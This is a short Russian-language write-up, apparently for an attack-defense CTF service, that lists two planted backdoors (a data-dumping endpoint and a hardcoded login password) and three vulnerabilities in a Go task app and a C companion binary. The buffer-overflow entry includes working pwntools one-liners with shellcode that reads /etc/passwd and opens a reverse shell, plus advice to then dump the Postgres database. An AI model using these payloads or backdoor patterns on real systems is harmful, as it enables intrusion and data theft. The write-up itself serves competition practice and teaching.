1. [Бэкдор №1] Ручка `/backd00r` (выгружает данные из базы: комменты и названия тасков)
2. [Бэкдор №2] `if reqUser.Password == "h33xed_1337"` в login.go
3. [Уязвимость №1, WEB Easy] Можно зарегаться заново под существующим юзером с новым паролем
4. [Уязвимость №2, WEB Medium] При создании таска можно передать `{'id': 6}`, где 6 - id того таска, который хотим перехватить.
`db.Create(&task)` (из `CreateTask`) упадёт с ошибкой, однако выполнение продолжится дальше:
```go
userTask := UserTasks{UserID: uint(userID), TaskID: task.ID}
db.Create(&userTask)
```
И данный код запишет userID НАШЕГО юзера на просмотр таска!

5. [Уязвимость №3, PWN Medium] Простая прога на C, считающая CRC32 - подаётся комментарий, можно переполнить буфер и получить RCE, после чего выгрузить БД postgres.  

Пример эксплуатации
(кучу rop-гаджетов позволяет получить статическая компиляция):
```bash
$ ROPgadget --binary=./companion_app | grep "call rsp"
0x00000000004252da : call rsp

$ python3 -c 'from pwn import *;x=open("pws","wb");x.write(b"A"*152+p64(0x4252da)+b"\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41");x.close()'
$ ./companion_app < pws
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
...
```
Реверс шелл на 127.0.0.1:4444 (по материалу https://shell-storm.org/shellcode/files/shellcode-907.html)
```bash
python3 -c 'from pwn import *;x=open("pws","wb");x.write(b"A"*152+p64(0x4252da)+b"j)X\x99j\x02_j\x01^\x0f\x05\x97\xb0*H\xb9\xfe\xff\xee\xa3\x80\xff\xff\xfeH\xf7\xd9QT^\xb2\x10\x0f\x05j\x03^\xb0!\xff\xce\x0f\x05u\xf8\x99\xb0;RH\xb9/bin//shQT_\x0f\x05");x.close()'
```
Далее уже очевидно - подключение к postgres базе и слив всего что можно оттуда.
